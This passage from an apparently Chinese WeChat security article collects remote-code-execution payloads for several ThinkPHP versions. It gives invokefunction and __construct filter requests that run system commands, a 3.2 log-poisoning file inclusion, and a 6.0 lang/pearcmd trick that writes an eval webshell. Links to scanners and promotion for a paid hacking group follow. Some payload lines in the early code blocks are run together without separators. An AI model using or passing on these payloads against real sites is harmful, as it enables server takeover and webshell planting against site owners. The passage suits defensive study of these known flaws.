50px;">5.0.22</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">是</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">需开启debug</td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.23</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">是</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">需开启debug</td></tr></tbody></table>  
5.0.13~5.0.19默认情况下config中的app_debug配置项为false，复现的时候需要开启这个  
  
总结一下  
  
5.1.x ：  
```
?s=index/thinkRequest/input&filter[]=system&data=pwd?s=index/thinkviewdriverPhp/display&content=<?php phpinfo();?>?s=index/thinktemplatedriverfile/write&cacheFile=shell.php&content=<?php phpinfo();?>?s=index/thinkContainer/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id?s=index/thinkapp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
```  
  
5.0.x ：  
```
?s=index/thinkconfig/get&name=database.username # 获取配置信息?s=index/thinkLang/load&file=../../test.jpg    # 包含任意文件?s=index/thinkConfig/load&file=../../t.php     # 包含任意.php文件?s=index/thinkapp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id?s=index|thinkapp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][0]=whoami
```  
  
5.0  
.13  
```
http://php.local/thinkphp5.0.5/public/index.php?s=indexpost_method=__construct&method=get&filter[]=call_user_func&get[]=phpinfo_method=__construct&filter[]=system&method=GET&get[]=whoami# ThinkPHP <= 5.0.13POST /?s=index/indexs=whoami&_method=__construct&method=&filter[]=system# ThinkPHP <= 5.0.23、5.1.0 <= 5.1.16 需要开启框架app_debugPOST /_method=__construct&filter[]=system&server[REQUEST_METHOD]=ls -al# ThinkPHP <= 5.0.23 需要存在xxx的method路由，例如captchaPOST /?s=xxx HTTP/1.1_method=__construct&filter[]=system&method=get&get[]=ls+-al_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls
```  
  
  
**ThinkPHP3.2.x RCE**  
# 1.漏洞介绍  
  
ThinkPHP3.2远程代码执行漏洞，该漏洞产生原因是由于在业务代码中如果对模板赋值方法assign的第一个参数可控，则导致模板路径变量被覆盖为携带攻击代码路径，造成文件包含，代码执行等危害。  
  
**2.版本**  
  
3.2.x  
  
**3.复现**  
  
先创建一个日志,并写入phpinfo  
  
index.php?m=--><?=phpinfo();?>  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uribSwIWP3w8uLzee8xc9v3enezUe1uaHyNicU49emhPtiaDmnZesibhuGfVSkSD2vlgXQyqViccsWXeKQ/640?wx_fmt=png "")  
  
然后去包含这个文件,文件名就是今天的日期  
```
index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Common/23_10_19.log
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uribSwIWP3w8uLzee8xc9v3eBwbbAriaAg7HD70hkgn0kpbpC06CvsSdXsEBfEROJbkJ8bpHNceG76w/640?wx_fmt=png "")  
# 不同版本日志位置不一样,看我总结  
#       
```
THINKPHP3.2 结构：
Application\Runtime\Logs\Home\日期.log
THINKPHP3.1结构：
Runtime\Logs\Home\日期.log
日志存储结构是 ：项目名\Runtime\Logs\Home\年份_月份_日期.log
```  
# thinkphp lang 命令执行  
  
  
**1 漏洞原理**  
  
在其6.0.13版本及以前，存在一处本地文件包含漏洞。当多语言特性被开启时，攻击者可以使用lang参数来包含任意PHP文件。  
  
虽然只能包含本地PHP文件，但在开启了register_argc_argv且安装了pcel/pear的环境下，可以包含/usr/local/lib/php/pearcmd.php并写入任意文件  
  
访问路径诶：/public/index.php  
  
**2 影响版本**  
  
6.0.1 < ThinkPHP≤ 6.0.13  
  
5.0.0 < ThinkPHP≤ 5.0.12  
  
5.1.0 < ThinkPHP≤ 5.1.8  
  
**3 前置知识**  
  
1.HTML之lang属性：在Html全局属性列表中，对lang属性的描述为（Defines the language used in the element - 定义元素中使用的语言），顾名思义，lang属性的作用就是用来定义元素中使用的语言。  
  
2.PEAR:PEAR也就是为PHP扩展与应用库(PHP Extension and Application Repository)，它是一个PHP扩展及应用的一个代码仓库。  
  
3.Pearcmd：pearcmd.php是pear工具调用的功能文件，pear是管理php的扩展管理工具， 可以理解为php的命令行工具。  
  
4.config-create：创建文件，该方法需接收两个参数，第一个参数是写入文件的内容，第二个参数是写入文件的路径  
  
**4 复现**  
  
访问  
public/index.php可以看到明显的tp特征  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5up6TPpuCn3NNwS5LDO7MqCO8vfYS9f5nw8Cmkq63fIichFj9wuHQ5eCia04LR9Vl2ibWEEGJ6ibP0BWYw/640?wx_fmt=png "")  
  
get访问  
```
?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=@eval($_REQUEST['milu']);?>+/var/www/html/milu.php
```  
  
解释一下  
payload  
  
就是利用目录遍历到pearcmd,然后  
通过 pearcmd 文件包含这个trick去执行创建/var/www/html/milu.php文件并写入一句话木马,密码为milu  
  
然后访问milu.php就行了  
  
**一些指纹工具和网站**  
  
TideFinger 潮汐指纹 TideFinger 潮汐指纹 (tidesec.com)  
  
https://github.com/anx0ing/thinkphp_scan  
  
https://github.com/sukabuliet/ThinkphpRCE  
  
https://github.com/bewhale/thinkphp_gui_tools  
  
https://github.com/Lotus6/ThinkphpGUI(无2版本检测功能)  
  
**最后总结个各版本的poc吧**  
  
2.x  
```
$res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));
```  
  
3.2.3  
```
index.php?m=--><?=phpinfo();?>
index.php?m=Home&c=Index&a=index&value[_filename]=.\Application\Runtime\Logs\Common\日期.log
```  
  
5.0.x  
```
?s=index/think\config/get&name=database.username // 获取配置信息
?s=index/\think\Lang/load&file=../../test.jpg // 包含任意文件
?s=index/\think\Config/load&file=../../t.php // 包含任意.php文件
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
?s=index|think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][0]=whoami
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][0]=whoami
call_user_func 不大行..
?s=index/\think\app/invokefunction?function=call_user_func&vars[0]=system&vars[1]=whoami
?s=index/\think\app/invokefunction&function=call_user_func&vars[0]=system&vars[1]=whoami
?s=index/\think\View/display&content=phpinfo();?>
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
s=index|think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][0]=1
s=index|think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][0]=2
s=index|think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][0]=...
```  
  
5.0.7  
```
aa=file_put_contents('test.php'%2C'%3C%3Fphp+phpinfo()%3B')&_method=__construct&method=POST&filter[]=assert
```  
  
5.0 - 5.0.22  
```
index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1]
[]=-1%20and%20it%27ll%20execute%20the%20phpinfo
```  
  
 5.0.23  
```
 ThinkPHP <= 5.0.23 需要存在xxx的method路由，例如captcha
POST /?s=xxx HTTP/1.1
_method=__construct&filter[]=system&method=get&get[]=ls+-al
_method=__construct&filter[]=system&method=get&.=ls
```  
  
   
  
5.1.x  
```
?s=index/\think\Request/input&filter[]=system&data=pwd 
?s=index/\think\view\driver\Php/display&content= 
s=index/\think\template\driver\file/write&cacheFile=shell.php&content= 
s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
?s=index/\think\app/invokefunction&function=call_user_func&vars[0]=system&vars[1]=whoami
?s=index/\think\request/input?data[]=-1&filter=phpinfo
?s=index/think\app/invokefunction?function=call_user_func&vars[0]=system&vars[1]=whoami
?s=index|think\app/invokefunction&function=call_user_func&vars[0]=phpinfo&vars[1]=1
?s=index/think\request/input?data[]=-1&filter=phpinfo
?s=index/think\app/invokefunction&function=call_user_func&vars[0]=md5&vars[1]=123456
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
?s=index/\think\View/display&content=
?s=index/think\View/display&content=
?s=index/think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami 
s=index/\think\app/invokefunction&function=call_user_func&vars[0]=system&vars[1]=whoami
?s=index/\think\app/invokefunction&function=call_user_func&vars[0]=system&vars[1]=powershell%20ls
chdir
```  
  
  
  
**★**  
  
**付费圈子**  
  
  
**欢 迎 加 入 星 球 ！**  
  
**代码审计+免杀+渗透学习资源+各种资料文档+各种工具+付费会员**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/pLGTianTzSu7XRhTMZOBAqXehvREhD5ThABGJdRialUx3dQWwO7fclsicyiajicKfvXV4kHs38nkwFxUSckVF2nYlibA/640?wx_fmt=gif&random=0.4447566002908574&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
**进成员内部群**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/pPVXCo8Wd8AQHAyOTgM5sLrvP6qiboXljGWG0uOdvcNR8Qw5QJLxSVrbFds2j7MxExOz1ozb9ZoYwR68leoLdAg/640?wx_fmt=jpeg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/pLGTianTzSu7XRhTMZOBAqXehvREhD5ThABGJdRialUx3dQWwO7fclsicyiajicKfvXV4kHs38nkwFxUSckVF2nYlibA/640?wx_fmt=gif&random=0.09738205945672873&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
**星球的最近主题和星球内部工具一些展示******  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/pPVXCo8Wd8Doq0iczyRiaBfhTQyfzqSGuia4lfHfazabEKr2EDe7sGVoxUhLrNRA4FbI1yef6IkWdmzxvZrTiaJncg/640?wx_fmt=jpeg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8BmE6FAA8Bq7H9GZIRt1xYZpmYNWxrrzolt71FtX5HyM03H0cxkiaYelv7ZSajLtibEdBXUpCibdItXw/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8ADSxxicsBmvhX9yBIPibyJTWnDpqropKaIKtZQE3B9ZpgttJuibibCht1jXkNY7tUhLxJRdU6gibnrn0w/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8DKZcqe8mOKY1OQN5yfOaD5MpGk0JkyWcDKZvqqTWL0YKO6fmC56kSpcKicxEjK0cCu8fG3mLFLeEg/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8CKksEIzZyEb3tEFGzGYSXfribrG4jKOkRKGKYb7zk7MTNZPT6Wp3bLd2BPhuFHddIL6sqrg1d2qHQ/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8D0bS8ibc3XhFcDYkVusFvc3c6onthQpPGZn4v32rpOp7CeFiamGdeC7JBk0mGVsiciazLp3z0SIJAtnQ/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8B96heXWOIseicx7lYZcN8KRN8xTiaOibRiaHVP4weL4mxd0gyaWSuTIVJhBRdBmWXjibmcfes6qR1w49w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8DKZcqe8mOKY1OQN5yfOaD5MpGk0JkyWcDKZvqqTWL0YKO6fmC56kSpcKicxEjK0cCu8fG3mLFLeEg/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8AqNwoQuOBy9yePOpO5Kr6aHIxj7d0ibfAuPx9fAempAoH9JfIgX4nKzCwDyhQzPrRIx4upyw5yT4Q/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
****  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/pLGTianTzSu7XRhTMZOBAqXehvREhD5ThABGJdRialUx3dQWwO7fclsicyiajicKfvXV4kHs38nkwFxUSckVF2nYlibA/640?wx_fmt=gif&random=0.4447566002908574&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
**加入安全交流群**  
  
  

								[                ](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247489372&idx=1&sn=5e14ba5fa59059fb1ee405e56ef90d40&chksm=c175eaf3f60263e5ef5415a8a9fc134f0890fdb9c25ab956116d17109baf98b3bd6bed572a2d&scene=21#wechat_redirect)  

			                  
  
  
**关 注 有 礼**  
  
  
  
关注下方公众号回复“  
666  
”可以领取一套领取黑客成长秘籍  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
 还在等什么？赶紧点击下方名片关注学习吧！![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
**推荐阅读**  
  
  
  
[干货｜史上最全一句话木马](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247489259&idx=1&sn=b268701409ad4e8785cd5ebc23176fc8&chksm=c175eb44f60262527120100bd353b3316948928bd7f44cf9b6a49f89d5ffafad88c6f1522226&scene=21#wechat_redirect)  
  
  
  
[干货 | CS绕过vultr特征检测修改算法](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247486980&idx=1&sn=6d65ae57f03bd32fddb37d7055e5ac8e&chksm=c175f3abf6027abdad06009b2fe964e79f2ca60701ae806b451c18845c656c12b9948670dcbc&scene=21#wechat_redirect)  
  
  
  
[实战 | 用中国人写的红队服务器搞一次内网穿透练习](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247488628&idx=1&sn=ff2c617cccc00fe262ed9610c790fe0e&chksm=c175e9dbf60260cd0e67439304c822d28d510f1e332867e78a07d631ab27143309d14e27e53f&scene=21#wechat_redirect)  
  
  
  
[实战 | 渗透某培训平台经历](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247488613&idx=1&sn=12884f3d196ac4f5c262a587590d516d&chksm=c175e9caf60260dcc0d5d81a560025d548c61fda975d02237d344fd79adc77ac592e7e562939&scene=21#wechat_redirect)  
  
  
  
[实战 | 一次曲折的钓鱼溯源反制](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247489278&idx=1&sn=5347fdbf7bbeb3fd37865e191163763f&chksm=c175eb51f602624777fb84e7928bb4fa45c30f35e27f3d66fc563ed97fa3c16ff06d172b868c&scene=21#wechat_redirect)  
  
  
  
**免责声明**  
  
由于传播、利用本公众号渗透安全团队所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号渗透安全团队及作者不为**此**  
承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！  
  
好文分享收藏赞一下最美点在看哦  
  
